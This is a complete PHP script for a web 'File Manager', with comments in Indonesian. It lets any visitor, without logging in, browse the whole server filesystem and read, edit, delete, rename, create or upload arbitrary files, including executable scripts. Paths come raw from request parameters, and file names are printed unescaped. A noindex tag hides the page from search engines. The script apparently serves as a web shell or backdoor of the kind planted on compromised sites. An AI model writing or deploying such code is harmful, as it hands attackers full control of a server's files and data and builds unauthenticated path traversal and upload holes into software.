<?php
session_start();

function createBreadcrumb($dirPath) {
    $parts = explode('/', $dirPath);
    $currentPath = '';
    $output = '<nav><ul style="list-style:none; padding:0;">';
    
    foreach ($parts as $key => $part) {
        if ($part === '') continue; // Lewati bagian kosong (seperti sebelum "/")
        
        $currentPath .= '/' . $part;
        if ($key === count($parts) - 1) {
            $output .= "<li style='display:inline;'>$part</li>"; // Bagian terakhir, tidak bisa diklik
        } else {
            $output .= "<li style='display:inline;'><a href='?dir=" . urlencode($currentPath) . "'>$part</a>/</li>";
        }
    }

    $output .= '</ul></nav>';
    return $output;
}

// Fungsi untuk daftar direktori dan file
function listDirectories($dirPath) {
    // Breadcrumb untuk path
    $output = createBreadcrumb($dirPath);

    // Tampilkan isi direktori dan file
    $output .= "<table border='1' cellpadding='5'><tr><th>Name</th><th>Type</th><th>Action</th></tr>";
    $files = scandir($dirPath);
    
    foreach ($files as $file) {
        if ($file === '.') continue;
        
        $filePath = $dirPath . '/' . $file;
        $type = is_dir($filePath) ? 'Folder' : 'File';
        
        $output .= "<tr>";
        if ($type == 'Folder') {
            if ($file == '..') {
                $parentDir = dirname($dirPath);
                $output .= "<td><a href='?dir=" . urlencode($parentDir) . "'>$file</a></td>";
                $output .= "<td>$type</td>";
                $output .= "<td></td>";
            } else {
                $output .= "<td><a href='?dir=" . urlencode($filePath) . "'>$file</a></td>";
                $output .= "<td>$type</td>";
                $output .= "<td></td>";
            }
        } else {
            $output .= "<td>$file</td>";
            $output .= "<td>$type</td>";
            $output .= "<td>
                        <a href='?download=" . urlencode($filePath) . "'>Download</a> | 
                        <a href='?delete=" . urlencode($filePath) . "'>Delete</a> | 
                        <a href='?edit=" . urlencode($filePath) . "'>Edit</a> | 
                        <a href='?rename=" . urlencode($filePath) . "'>Rename</a>
                    </td>";
        }
        $output .= "</tr>";
    }
    
    $output .= "</table>";
    return $output;
}

// Fungsi untuk menghapus file
function deleteFile($filePath) {
    if (is_file($filePath)) {
        unlink($filePath);
    }
}

// Fungsi untuk membuat direktori baru
function createDirectory($dirPath, $dirName) {
    $newDir = $dirPath . '/' . $dirName;
    if (!is_dir($newDir)) {
        mkdir($newDir);
    }
}

// Fungsi untuk membuat file baru
function createFile($dirPath, $fileName) {
    $newFile = $dirPath . '/' . $fileName;
    if (!file_exists($newFile)) {
        touch($newFile);
    }
}

// Fungsi untuk mengunggah file
function uploadFile($dirPath) {
    $file = $_FILES['uploaded_file'];

    // Check if upload directory is writable
    if (!is_writable($dirPath)) {
        return "Upload directory '" . $dirPath . "' is not writable.";
    }

    // Handle file upload
    $fileName = basename($file['name']);
    $targetFile = $dirPath . '/' . $fileName;

    move_uploaded_file($file['tmp_name'], $targetFile);
}

// Fungsi untuk mengedit file
function editFile($filePath) {
    if (isset($_POST['save_file'])) {
        file_put_contents($filePath, $_POST['file_content']);
        header("Location: ?dir=" . urlencode(dirname($filePath)));
        exit;
    } else {
        $content = file_get_contents($filePath);
        echo "
        <h2>Editing File: " . basename($filePath) . "</h2>
        <form method='post'>
            <textarea name='file_content' rows='20' cols='80'>" . htmlspecialchars($content) . "</textarea><br><br>
            <input type='submit' name='save_file' value='Save Changes'>
            <a href='?dir=" . urlencode(dirname($filePath)) . "'>Cancel</a>
        </form>";
    }
}

// Fungsi untuk mengganti nama file
function renameFile($oldPath, $newName) {
    $newPath = dirname($oldPath) . '/' . $newName;
    if (!file_exists($newPath)) {
        rename($oldPath, $newPath);
    }
}

// Fungsi untuk mengunduh file
function downloadFile($filePath) {
    if (file_exists($filePath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
        header('Content-Length: ' . filesize($filePath));
        flush();
        readfile($filePath);
        exit;
    }
}

$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

if (isset($_GET['delete'])) {
    deleteFile($_GET['delete']);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_POST['new_folder'])) {
    createDirectory($currentDir, $_POST['folder_name']);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_POST['new_file'])) {
    createFile($currentDir, $_POST['file_name']);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_FILES['uploaded_file'])) {
    uploadFile($currentDir);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_GET['download'])) {
    downloadFile($_GET['download']);
    exit;
}

if (isset($_GET['edit'])) {
    editFile($_GET['edit']);
    exit;
}

if (isset($_GET['rename'])) {
    $fileToRename = $_GET['rename'];
    $currentFileName = basename($fileToRename);
    echo "
    <h2>Rename File: " . htmlspecialchars($currentFileName) . "</h2>
    <form method='post'>
        <input type='text' name='new_name' value='" . htmlspecialchars($currentFileName) . "'>
        <input type='submit' name='rename_file' value='Rename'>
        <a href='?dir=" . urlencode(dirname($fileToRename)) . "'>Cancel</a>
    </form>";
}

if (isset($_POST['rename_file']) && isset($_GET['rename'])) {
    $oldFilePath = $_GET['rename'];
    $newFileName = $_POST['new_name'];
    renameFile($oldFilePath, $newFileName);
    header("Location: ?dir=" . urlencode(dirname($oldFilePath)));
    exit;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP File Manager</title>
    <meta name="robots" content="noindex, nofollow" />
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .container {
            width: 80%;
            margin: 20px auto;
        }
        .actions {
            margin-bottom: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid black;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        a {
            text-decoration: none;
            color: blue;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>File Manager</h1>

        <div class="actions">
            <form method="post" enctype="multipart/form-data" style="display:inline;">
                <input type="file" name="uploaded_file">
                <input type="submit" value="Upload File">
            </form>

            <form method="post" style="display:inline;">
                <input type="text" name="folder_name" placeholder="New Folder Name">
                <input type="submit" name="new_folder" value="Create Folder">
            </form>

            <form method="post" style="display:inline;">
                <input type="text" name="file_name" placeholder="New File Name">
                <input type="submit" name="new_file" value="Create File">
            </form>
        </div>

        <?php
        if (isset($_GET['edit'])) {
            // Editing a file
            editFile($_GET['edit']);
        } else {

            echo listDirectories($currentDir);
        }
        ?>
    </div>
</body>
</html>
